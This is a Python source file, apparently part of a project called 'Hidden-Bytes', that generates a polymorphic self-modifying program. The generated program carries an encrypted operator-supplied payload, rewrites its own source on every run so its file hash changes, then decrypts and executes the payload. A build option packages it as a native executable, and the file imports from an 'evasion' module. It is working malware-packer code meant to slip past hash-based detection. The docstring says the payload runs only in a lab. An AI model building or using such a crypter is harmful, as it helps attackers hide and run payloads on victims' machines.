#!/usr/bin/env python3
"""Hidden-Bytes — Polymorphic self-modifying program generator.

Generates a program that:

- carries an encrypted payload inside itself,
- rewrites its own source file on every run, so its SHA-256 changes while its
  behaviour stays identical,
- decrypts and executes the payload when it starts.

This is the "polymorphic" half of the project. The payload is supplied by
the operator and is executed only inside the isolated lab environment.

The generated program has no third-party dependency: the AES-256-GCM
implementation is spliced into it, so it runs on a machine with nothing but a
Python 3 interpreter.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import os
import secrets
import sys
from pathlib import Path

from .embedding import build_executable, pure_aes_source

MAX_PAYLOAD = 64 * 1024
NONCE_BYTES = 12
KEY_BYTES = 32
SALT_BYTES = 16
KDF_ITERATIONS = 200_000

# The name of the variable that holds the self-modification token in the
# generated source. The token's value changes on every run, which changes
# the file hash without changing the program's behaviour.
MUTATION_VARIABLE = "MUTATION_TOKEN"


TEMPLATE = '''#!/usr/bin/env python3
"""Generated polymorphic demonstration.

This program rewrites its own source file on every run, which changes its
SHA-256 while keeping its behaviour identical, then decrypts and executes
the payload embedded in it.
"""

import base64
import hashlib
import os
import sys

PAYLOAD_CIPHERTEXT = "{payload_ciphertext}"
PAYLOAD_SALT = "{payload_salt}"
PAYLOAD_NONCE = "{payload_nonce}"
PAYLOAD_SHA256 = "{payload_sha256}"
PAYLOAD_AAD = b"HBXP"
KDF_ITERATIONS = {kdf_iterations}
PASSPHRASE_ENV = "{passphrase_env}"

{pure_aes_source}

MUTATION_TOKEN = "{mutation_token}"


def _update_signature():
    """Rewrite this program's own signature, changing its file hash."""

    path = os.path.abspath(__file__)

    try:
        with open(path, "r", encoding="utf-8") as handle:
            source = handle.read()
    except OSError:
        return None

    old = {old_mutation_line}
    new = {new_mutation_line}

    if old not in source:
        return None

    with open(path, "w", encoding="utf-8") as handle:
        handle.write(source.replace(old, new, 1))

    return new


def _read_passphrase():
    """Read the passphrase from the environment or the terminal."""

    value = os.environ.get(PASSPHRASE_ENV)
    if value:
        return value

    if not sys.stdin.isatty():
        raise SystemExit(
            "no passphrase available: set the "
            + PASSPHRASE_ENV
            + " environment variable"
        )

    import getpass

    return getpass.getpass("Passphrase: ")


def _recover_payload():
    """Derive the key, decrypt the payload and verify its integrity."""

    passphrase = _read_passphrase()
    salt = base64.b64decode(PAYLOAD_SALT)
    nonce = base64.b64decode(PAYLOAD_NONCE)
    ciphertext = base64.b64decode(PAYLOAD_CIPHERTEXT)

    key = hashlib.pbkdf2_hmac(
        "sha256",
        passphrase.encode("utf-8"),
        salt,
        KDF_ITERATIONS,
        dklen=32,
    )

    plaintext = decrypt_gcm(key, nonce, ciphertext, PAYLOAD_AAD)

    if hashlib.sha256(plaintext).hexdigest() != PAYLOAD_SHA256:
        raise SystemExit("payload integrity check failed")

    return plaintext


def main():
    print("[INFO] Polymorphic signature updated successfully.", flush=True)

    _update_signature()

    try:
        payload = _recover_payload()
    except Exception as exc:  # noqa: BLE001 - report and stop
        print("[ERROR] " + str(exc), file=sys.stderr)
        return 1

    # The payload receives this program's own arguments, so the operator
    # can configure it (host, port, ...) at run time.
    namespace = {
        "__name__": "__main__",
        "__file__": "payload",
        "__builtins__": __builtins__,
    }
    exec(compile(payload, "payload", "exec"), namespace)  # noqa: S102

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
'''


def _load_payload(payload_arg: str) -> bytes:
    """Read the payload from the file the operator supplied."""

    candidate = Path(payload_arg)

    if not candidate.is_file():
        raise ValueError(f"payload file does not exist: {payload_arg}")

    payload = candidate.read_bytes()

    if not payload.strip():
        raise ValueError("payload must not be empty")

    if len(payload) > MAX_PAYLOAD:
        raise ValueError(
            f"payload exceeds the {MAX_PAYLOAD}-byte limit"
        )

    return payload


def _build_source(
    payload: bytes,
    passphrase: str | None,
    passphrase_source: dict | None,
) -> str:
    """Build the generated program.

    The encryption key is **not** stored in the generated program. Only the
    salt is, and the key is derived from the passphrase when the program
    runs. Without the passphrase the payload cannot be recovered.
    """

    if passphrase is None:
        raise ValueError(
            "a passphrase is required to protect the embedded payload"
        )

    salt = os.urandom(SALT_BYTES)
    key = hashlib.pbkdf2_hmac(
        "sha256",
        passphrase.encode("utf-8"),
        salt,
        KDF_ITERATIONS,
        dklen=KEY_BYTES,
    )
    nonce = os.urandom(NONCE_BYTES)

    ciphertext = _encrypt(key, nonce, payload)

    mutation_token = secrets.token_hex(16)
    new_mutation_token = secrets.token_hex(16)

    env_name = "HBX_PASSPHRASE"
    if passphrase_source:
        env_name = passphrase_source.get("env", env_name)

    source = TEMPLATE
    source = source.replace(
        "{payload_ciphertext}", base64.b64encode(ciphertext).decode("ascii"), 1
    )
    source = source.replace(
        "{payload_salt}", base64.b64encode(salt).decode("ascii"), 1
    )
    source = source.replace(
        "{payload_nonce}", base64.b64encode(nonce).decode("ascii"), 1
    )
    source = source.replace(
        "{payload_sha256}", hashlib.sha256(payload).hexdigest(), 1
    )
    source = source.replace("{kdf_iterations}", str(KDF_ITERATIONS), 1)
    source = source.replace("{passphrase_env}", env_name, 1)
    source = source.replace("{pure_aes_source}", pure_aes_source(), 1)
    source = source.replace("{mutation_token}", mutation_token, 1)
    source = source.replace(
        "{old_mutation_line}", repr(f'{MUTATION_VARIABLE} = "{mutation_token}"'), 1
    )
    source = source.replace(
        "{new_mutation_line}",
        repr(f'{MUTATION_VARIABLE} = "{new_mutation_token}"'),
        1,
    )

    return source

    return source


def _encrypt(key: bytes, nonce: bytes, payload: bytes) -> bytes:
    """Encrypt the payload with AES-256-GCM."""

    from .evasion.pure_aes import encrypt_gcm

    return encrypt_gcm(key, nonce, payload, b"HBXP")


def generate(
    output: Path,
    payload_arg: str,
    passphrase: str,
    passphrase_source: dict | None = None,
) -> None:
    """Generate a polymorphic program carrying the supplied payload."""

    output = output.resolve()
    payload = _load_payload(payload_arg)

    source = _build_source(payload, passphrase, passphrase_source)

    # Validate syntax before writing the generated program.
    compile(source, str(output), "exec")

    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text(source, encoding="utf-8")

    try:
        output.chmod(0o755)
    except OSError:
        pass


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="polymorphic",
        description=(
            "Generate a self-modifying program that carries an encrypted "
            "payload. Every run rewrites the program's own source, so its "
            "hash changes while its behaviour stays the same."
        ),
    )

    parser.add_argument(
        "--generate",
        required=True,
        metavar="OUTPUT",
        help="path of the generated program",
    )

    parser.add_argument(
        "--payload",
        required=True,
        metavar="PAYLOAD_FILE",
        help="path to the payload file to embed",
    )

    parser.add_argument(
        "--passphrase",
        help=(
            "passphrase protecting the embedded payload. The key is derived "
            "with PBKDF2-HMAC-SHA256. Prompted for when omitted."
        ),
    )

    parser.add_argument(
        "--passphrase-file",
        type=Path,
        help="read the passphrase from the first line of this file",
    )

    parser.add_argument(
        "--build-exe",
        action="store_true",
        help=(
            "package the generated program as a single native executable "
            "with PyInstaller (produces a .exe on Windows)"
        ),
    )

    return parser


def _read_passphrase(args: argparse.Namespace) -> tuple[str, dict]:
    """Resolve the passphrase and describe where it can be found again."""

    if args.passphrase is not None:
        return args.passphrase, {}

    if args.passphrase_file is not None:
        if not args.passphrase_file.is_file():
            raise ValueError(
                f"passphrase file does not exist: {args.passphrase_file}"
            )
        passphrase = args.passphrase_file.read_text(
            encoding="utf-8"
        ).splitlines()[0]
        return passphrase, {"file": str(args.passphrase_file.resolve())}

    environment = os.environ.get("HBX_PASSPHRASE")
    if environment:
        return environment, {"env": "HBX_PASSPHRASE"}

    if not sys.stdin.isatty():
        raise ValueError(
            "no passphrase available: use --passphrase, --passphrase-file or "
            "set the HBX_PASSPHRASE environment variable"
        )

    import getpass

    return getpass.getpass("Passphrase: "), {"env": "HBX_PASSPHRASE"}


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    try:
        passphrase, passphrase_source = _read_passphrase(args)

        output = Path(args.generate)

        generate(
            output=output,
            payload_arg=args.payload,
            passphrase=passphrase,
            passphrase_source=passphrase_source,
        )

        print(
            f'[OK] Generated polymorphic program: "{output}"'
        )
        print(
            "[INFO] The payload is encrypted inside the generated program."
        )
        print(
            "[INFO] Every run rewrites the program's own source, so its "
            "hash changes while its behaviour stays the same."
        )

        if args.build_exe:
            executable = output.with_suffix(".exe" if os.name == "nt" else "")
            build_executable(
                script_path=output,
                output=executable,
                name=executable.stem,
            )
            print(
                f'[OK] Packaged native executable: "{executable}"'
            )

        return 0

    except (OSError, UnicodeError, ValueError) as error:
        print(
            f"polymorphic: error: {error}",
            file=sys.stderr,
        )
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
